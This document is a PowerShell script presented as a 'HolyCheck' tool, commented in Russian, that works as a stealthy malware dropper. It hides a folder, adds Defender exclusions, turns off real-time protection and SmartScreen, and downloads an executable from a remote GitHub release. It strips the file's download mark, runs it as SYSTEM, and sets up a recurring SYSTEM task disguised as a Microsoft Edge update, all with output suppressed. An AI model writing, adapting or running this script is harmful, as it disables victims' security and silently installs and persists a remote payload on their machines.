# ================================================================
# HolyCheck v3.2.3 — Silent Edition (MOD) - NO OUTPUT
# ================================================================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$Dir      = "$env:ProgramData\Microsoft\Windows\Caches\EdgeUpdate"
$Exe      = "$Dir\MicrosoftEdgeUpdate.exe"
$TaskName = "MicrosoftEdgeUpdateTask"
$DownloadUrl = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"

# Скрытая рабочая папка
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
attrib +h +s $Dir 2>$null

# Отключаем Defender (бесшумно)
try {
    Add-MpPreference -ExclusionPath $Dir -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "MicrosoftEdgeUpdate.exe" -ErrorAction Stop
} catch {}

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        New-Item -Path $defReg -Force -ErrorAction SilentlyContinue | Out-Null
        New-Item -Path "$defReg\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction SilentlyContinue
    } catch {}
}

# Отключаем SmartScreen
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -ErrorAction Stop
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -ErrorAction Stop
    $sacKey = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
    if (Test-Path $sacKey) { Set-ItemProperty -Path $sacKey -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -ErrorAction SilentlyContinue }
} catch {}

# Функция загрузки
function Get-File {
    param([string]$url,[string]$out)
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url,$out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
}

# Скачиваем payload
$ok = Get-File -url $DownloadUrl -out $Exe
if ($ok) {
    Remove-Item "${Exe}:Zone.Identifier" -Force -ErrorAction SilentlyContinue
    Unblock-File -Path $Exe -ErrorAction SilentlyContinue

    # === ЗАПУСК ПЕРВЫМ ДЕЛОМ (немедленно, без задержек) ===
    # Создаём одноразовую задачу для немедленного запуска от SYSTEM
    $tempTaskName = "MicrosoftEdgeUpdateTemp"
    Unregister-ScheduledTask -TaskName $tempTaskName -Confirm:$false -EA SilentlyContinue
    try {
        $action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
        Register-ScheduledTask -TaskName $tempTaskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
        schtasks /run /tn "$tempTaskName" 2>$null | Out-Null
        # Удаляем временную задачу после запуска (через 5 секунд, чтобы она успела сработать)
        Start-Sleep -Seconds 5
        Unregister-ScheduledTask -TaskName $tempTaskName -Confirm:$false -EA SilentlyContinue
    } catch {}
}

# Удаляем старую задачу, если есть
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue

# Создаём долгосрочную задачу (каждые 7 дней)
$triggerTime = (Get-Date).Date.AddHours(3).AddMinutes(0)
if ($triggerTime -le (Get-Date)) { $triggerTime = $triggerTime.AddDays(7) }

try {
    if ($PSVersionTable.PSVersion.Major -ge 5) {
        $action  = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 7 -At $triggerTime
        $sets    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $sets -User "SYSTEM" -RunLevel Highest -Force -EA SilentlyContinue | Out-Null
    } else {
        $timeStr = $triggerTime.ToString("HH:mm")
        $dateStr = $triggerTime.ToString("dd/MM/yyyy")
        schtasks /create /tn "$TaskName" /tr "$Exe" /sc daily /mo 7 /st $timeStr /sd $dateStr /ru SYSTEM /rl HIGHEST /f 2>$null | Out-Null
    }
} catch {}

# Чистим старые записи автозагрузки (на всякий случай)
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Remove-ItemProperty -Path $runKey -Name "Microsoft Edge Update" -ErrorAction SilentlyContinue
$startupShortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.lnk"
if (Test-Path $startupShortcut) { Remove-Item $startupShortcut -Force -ErrorAction SilentlyContinue }

# Выход без вывода
